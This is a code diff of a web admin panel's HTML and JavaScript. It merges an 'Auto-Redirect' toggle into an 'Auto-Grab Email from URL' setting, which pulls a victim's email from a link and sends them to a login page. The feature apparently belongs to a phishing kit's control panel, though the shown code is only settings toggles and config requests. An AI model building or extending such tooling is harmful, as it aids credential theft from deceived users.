@@ -831,23 +831,16 @@
                     <h3 style="color: #f1f5f9; font-size: 16px; font-weight: 600; margin: 0 0 16px 0;">URL Parser Settings</h3>
 
                     <div class="form-group">
-                        <label class="form-label">Enable Auto-Grab:</label>
+                        <label class="form-label">Auto-Grab Email from URL:</label>
                         <div style="display: flex; gap: 12px; align-items: center;">
                             <button onclick="toggleAutoGrab()" id="autograb-toggle-btn" class="btn">
                                 Enable Auto-Grab
                             </button>
                             <span id="autograb-toggle-status" style="color: #94a3b8; font-size: 14px;">Currently disabled</span>
                         </div>
-                    </div>
-
-                    <div class="form-group">
-                        <label class="form-label">Auto-Redirect After Parse:</label>
-                        <div style="display: flex; gap: 12px; align-items: center;">
-                            <button onclick="toggleAutoRedirect()" id="autoredirect-toggle-btn" class="btn">
-                                Toggle Auto-Redirect
-                            </button>
-                            <span id="autoredirect-toggle-status" style="color: #94a3b8; font-size: 14px;">Currently enabled</span>
-                        </div>
+                        <p style="font-size: 13px; color: #94a3b8; margin-top: 8px;">
+                            When enabled, automatically extracts email from URL and redirects to login page.
+                        </p>
                     </div>
                 </div>
 
@@ -1884,22 +1877,12 @@
                     const toggleStatus = document.getElementById('autograb-toggle-status');
                     if (config.enabled) {
                         toggleBtn.textContent = 'Disable Auto-Grab';
-                        toggleStatus.textContent = 'Currently enabled';
+                        toggleStatus.textContent = 'Currently enabled (auto-redirect active)';
                         toggleStatus.style.color = '#22c55e';
                     } else {
                         toggleBtn.textContent = 'Enable Auto-Grab';
                         toggleStatus.textContent = 'Currently disabled';
                         toggleStatus.style.color = '#94a3b8';
-                    }
-
-                    const redirectBtn = document.getElementById('autoredirect-toggle-btn');
-                    const redirectStatus = document.getElementById('autoredirect-toggle-status');
-                    if (config.autoRedirect) {
-                        redirectStatus.textContent = 'Currently enabled';
-                        redirectStatus.style.color = '#22c55e';
-                    } else {
-                        redirectStatus.textContent = 'Currently disabled';
-                        redirectStatus.style.color = '#94a3b8';
                     }
                 }
             } catch (error) {
@@ -1924,10 +1907,14 @@
 
                 const newState = !data.config.enabled;
 
+                // Update both enabled and autoRedirect together
                 const updateResponse = await fetch(`/api/admin/autograb/config?token=${encodeURIComponent(token)}`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ enabled: newState })
+                    body: JSON.stringify({ 
+                        enabled: newState,
+                        autoRedirect: newState  // Enable/disable auto-redirect with auto-grab
+                    })
                 });
 
                 const updateData = await updateResponse.json();
@@ -1944,42 +1931,7 @@
             }
         }
 
-        async function toggleAutoRedirect() {
-            if (!isAuthenticated) {
-                alert('Please log in first');
-                return;
-            }
-
-            try {
-                const token = getStoredToken();
-                const response = await fetch(`/api/admin/autograb/config?token=${encodeURIComponent(token)}`);
-                const data = await response.json();
-
-                if (!data.success) {
-                    throw new Error(data.error || 'Failed to get config');
-                }
-
-                const newState = !data.config.autoRedirect;
-
-                const updateResponse = await fetch(`/api/admin/autograb/config?token=${encodeURIComponent(token)}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ autoRedirect: newState })
-                });
-
-                const updateData = await updateResponse.json();
-
-                if (!updateData.success) {
-                    throw new Error(updateData.error || 'Failed to update config');
-                }
-
-                loadAutoGrabConfig();
-                alert(`Auto-Redirect ${newState ? 'enabled' : 'disabled'} successfully!`);
-            } catch (error) {
-                console.error('Error toggling auto-redirect:', error);
-                alert(`Failed to toggle auto-redirect: ${error.message}`);
-            }
-        }
+        
 
         async function testAutoGrabUrl() {
             if (!isAuthenticated) {
